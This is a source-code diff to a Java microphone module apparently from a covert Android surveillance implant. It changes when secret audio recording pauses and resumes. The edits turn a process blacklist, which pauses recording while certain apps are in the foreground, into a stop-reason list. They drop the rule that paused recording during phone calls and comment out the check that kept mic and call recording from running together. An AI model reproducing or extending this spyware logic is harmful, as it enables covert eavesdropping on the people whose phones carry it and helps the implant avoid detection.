@@ -50,9 +50,10 @@ import java.util.Set;
  * @author zeno
  * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
  */
-public abstract class ModuleMic extends BaseModule implements Observer<Call>, OnErrorListener, OnInfoListener {
+public abstract class ModuleMic extends BaseModule implements  OnErrorListener, OnInfoListener {
 
 	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
+	private static final String STOP_REASON_PROCESS = "BLACKLISTED_PROCESS"; //$NON-NLS-1$
 	protected static final long MIC_PERIOD = 5000;
 	// #!AMR[space]
 	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
@@ -68,11 +69,9 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	 */
 	MediaRecorder recorder;
 
-	boolean phoneListening;
 	private Observer<ProcessInfo> processObserver;
 
 	public Set<String> blacklist = new HashSet<String>();
-	private boolean allowResume = true;
 
 	public ModuleMic() {
 		super();
@@ -293,13 +292,19 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 
 	}
 
+	@Override
+	public void notifyStop(String b, boolean add) {
+		if(add){
+			suspend();
+		}else if(!haveStops()){
+			resume();
+		}
+	}
+
 	abstract void specificGo(int numFailures);
 
 	private void addPhoneListener() {
-		if (!phoneListening) {
-			ListenerCall.self().attach(this);
-			phoneListening = true;
-		}
+
 
 		if (processObserver == null) {
 			processObserver = new ProcessObserver(this);
@@ -308,11 +313,6 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	}
 
 	private void removePhoneListener() {
-		if (phoneListening) {
-			ListenerCall.self().detach(this);
-			phoneListening = false;
-		}
-
 		ListenerProcess.self().detach(processObserver);
 	}
 
@@ -323,26 +323,11 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (notifyProcess) headset: " + headset);
 		}
-		for (String bl : blacklist) {
-			if (b.processInfo.contains(bl)) {
-				if (b.status == ProcessStatus.START) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (notifyProcess) blacklist started, " + b.processInfo);
-					}
-					suspend();
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (notifyProcess) blacklist stopped, " + b.processInfo);
-					}
-					resume();
-				}
-			}
-		}
+		isForegroundBlacklist();
 	}
 
 	int index = 0;
 	byte[] unfinished = null;
-	private boolean callOngoing;
 
 	protected synchronized void saveRecorderEvidence() {
 
@@ -478,36 +463,20 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		return additionalData;
 	}
 
-	public int notification(Call call) {
-		if (call.isOngoing()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): call incoming, suspend");//$NON-NLS-1$
-			}
-			callOngoing = true;
-			suspend();
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): ");//$NON-NLS-1$
-			}
-			callOngoing = false;
-			resume();
-		}
-		return 1;
-	}
 
 	public int notification(Standby b) {
 		if (b.isScreenOff()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification) standby, resume mic");
 			}
-			resume();
+			if(canRecordMic()) {
+				resume();
+			}
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification) unlocking, resume mic");
 			}
-			if (isForegroundBlacklist()) {
-				suspend();
-			}
+			isForegroundBlacklist();
 		}
 		return 0;
 	}
@@ -519,8 +488,14 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (isForegroundBlacklist) found blacklist");
 				}
+				if(!stopList.contains(STOP_REASON_PROCESS)) {
+					addStop(STOP_REASON_PROCESS);
+				}
 				return true;
 			}
+		}
+		if(stopList.contains(STOP_REASON_PROCESS)) {
+			removeStop(STOP_REASON_PROCESS);
 		}
 		return false;
 	}
@@ -528,27 +503,28 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 
 
 	public boolean canRecordMic() {
-		if (!Status.crisisMic() && !callOngoing) {
-			if (isForegroundBlacklist() && ListenerStandby.isScreenOn()) {
+		if (!Status.crisisMic() && !haveStops()) {
+			if (isForegroundBlacklist() ) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (canRecordMic) can't resume because of blacklist");
 				}
 				return false;
 			}
-
+/* try to run mic and call at the same time
 			if (ModuleCall.self() != null && (ModuleCall.self().isBooted()==false || ModuleCall.self().canRecord()) ) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (canRecordMic) can't switch on mic because call is available");
 				}
 				return false;
 			}
+			*/
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (canRecordMic)yes we can rec");
 			}
 			return true;
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (canRecordMic) crisis or call, cant rec");
+			Check.log(TAG + " (canRecordMic) crisis or stoplist, cant rec");
 		}
 		return false;
 	}
@@ -557,7 +533,7 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 	abstract void specificResume();
 	@Override
 	public synchronized void resume() {
-		if (isSuspended() && allowResume && canRecordMic()) {
+		if (isSuspended() && canRecordMic()) {
 			specificResume();
 			try {
 				specificStart();
@@ -578,27 +554,32 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 			}
 		}else{
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (resume): cannot resume : allowresume="+allowResume+" canRecord "+ canRecordMic() + " isSuspended=" + isSuspended());
+				Check.log(TAG + " (resume): cannot resume : canRecord "+ canRecordMic() + " isSuspended=" + isSuspended());
 			}
 		}
 	}
 	@Override
 	public synchronized void suspend() {
 		if (!isSuspended()) {
-			super.suspend();
 			specificSuspend();
-			if (allowResume == false) {
-				removePhoneListener();
-				ListenerStandby.self().detach(standbyObserver);
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (suspended)");//$NON-NLS-1$
+			if (Status.self().semaphoreMediaserver.tryAcquire()) {
+				try {
+					super.suspend();
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (suspended)");//$NON-NLS-1$
+					}
+				} finally {
+					Status.self().semaphoreMediaserver.release();
+				}
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (suspend): not suspending really because of mediaserver stopped by RCS");//$NON-NLS-1$
+				}
 			}
 		}
 	}
 
 	public void stop() {
-		allowResume = false;
 		suspend();
 	}
 
